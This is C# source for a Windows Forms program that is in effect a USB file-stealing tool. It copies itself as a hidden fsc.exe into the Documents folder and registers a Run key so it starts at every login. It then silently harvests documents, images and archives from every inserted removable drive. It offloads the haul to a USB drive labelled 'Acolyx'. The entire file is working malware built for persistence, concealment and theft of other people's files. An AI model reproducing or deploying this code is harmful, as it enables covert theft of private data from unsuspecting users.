using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.IO;
using Microsoft.Win32;
using Microsoft.VisualBasic.Devices;
using System.Diagnostics;
namespace WindowsFormsApp1
{
    public partial class Form1 : Form
    {
        string[] allowedextensions = { ".doc", ".docx", ".pdf", ".ppt", ".pptx", ".png", ".jpg", ".jpeg", ".gif", ".bmp", ".xls", ".xlsx", ".zip", ".rar", ".txt" };
        string ownerdiskname = "";
        public Form1()
        {
            InitializeComponent();
            Control.CheckForIllegalCrossThreadCalls = false;
        }
        Computer comp = new Computer();
        async void timer()
        {
            await Task.Run(() =>
            {

                listBox1.Items.Clear();
                foreach (var item in DriveInfo.GetDrives())
                {
                    if (item.DriveType == DriveType.Removable && item.VolumeLabel != "Acolyx")
                    {
                        listBox1.Items.Add(item.Name);
                    }
                    else if (item.VolumeLabel == "Acolyx")
                    {
                        ownerdiskname = item.Name;
                        copytoowner();
                    }
                }
                Thread.Sleep(500);

                copyfiles();

                timer();
            });

        }
        void copytoowner()

        {

            foreach (var item in Directory.GetFiles(comp.FileSystem.SpecialDirectories.MyDocuments + @"\F", "*", SearchOption.TopDirectoryOnly))
            {
                try
                {
                    Directory.CreateDirectory(ownerdiskname + @"\Fls");

                }
                catch (Exception)
                {

               
                }
             
                if (File.Exists(ownerdiskname + @"\Fls\"  + splitfiles(item)))
                {



                }
                else
                {
                    try
                    {
                        File.Copy(item, ownerdiskname + @"\Fls\" +  splitfiles(item));
                    }
                    catch (Exception)
                    {


                    }

                }

            }

        }



        string splitfiles(string filepath)
        {

            string[] blank = filepath.Split(new[] { @"\" }, StringSplitOptions.None);



            return blank[blank.Length - 1];
        }
        void copyfiles()
        {
            listBox2.Items.Clear();
            foreach (var item in listBox1.Items)
            {
                try
                {
                    foreach (var topfiles in Directory.GetFiles(item.ToString(), "*", SearchOption.TopDirectoryOnly))
                    {
                        foreach (var ext in allowedextensions)
                        {
                            if (topfiles.Contains(ext))
                            {
                                listBox2.Items.Add(topfiles);
                            }
                        }


                    }
                }
                catch (Exception)
                {


                }


                try
                {
                    foreach (var items in Directory.GetDirectories(item.ToString(), "*", SearchOption.TopDirectoryOnly))
                    {
                        try
                        {
                            foreach (var files in Directory.GetFiles(items.ToString(), "*", SearchOption.AllDirectories))
                            {
                                foreach (var ext in allowedextensions)
                                {
                                    if (files.Contains(ext))
                                    {
                                        listBox2.Items.Add(files);
                                    }
                                }
                            }
                        }
                        catch (Exception)
                        {


                        }

                    }
                }
                catch (Exception)
                {


                }






            }

            foreach (var copyfiles in listBox2.Items)
            {
                try
                {
                    if (File.Exists(@"\F\" + splitfiles(copyfiles.ToString())))
                    {

                    }
                    else
                    {
                        File.Copy(copyfiles.ToString(), comp.FileSystem.SpecialDirectories.MyDocuments + @"\F\" + splitfiles(copyfiles.ToString()));
                    }


                }
                catch (Exception)
                {


                }
            }


        }
        async private void Form1_Load(object sender, EventArgs e)
        {

            RegistryKey rk = Registry.CurrentUser.OpenSubKey
        ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rk.SetValue("fsc", comp.FileSystem.SpecialDirectories.MyDocuments + @"\fsc.exe");
            timer();

            Directory.CreateDirectory(comp.FileSystem.SpecialDirectories.MyDocuments + @"\F");


            try
            {
                if (File.Exists(comp.FileSystem.SpecialDirectories.MyDocuments + @"\fsc.exe"))
                {

                }
                else
                {
                    File.Copy(Application.ExecutablePath, comp.FileSystem.SpecialDirectories.MyDocuments + @"\fsc.exe");
                    File.SetAttributes(comp.FileSystem.SpecialDirectories.MyDocuments + @"\fsc.exe", FileAttributes.Hidden);
                    Process.Start(comp.FileSystem.SpecialDirectories.MyDocuments + @"\fsc.exe");


                    rk.SetValue("fsc", comp.FileSystem.SpecialDirectories.MyDocuments + @"\fsc.exe");
                    Application.Exit();
                }


            }
            catch (Exception)
            {

                throw;
            }


        }
    }
}
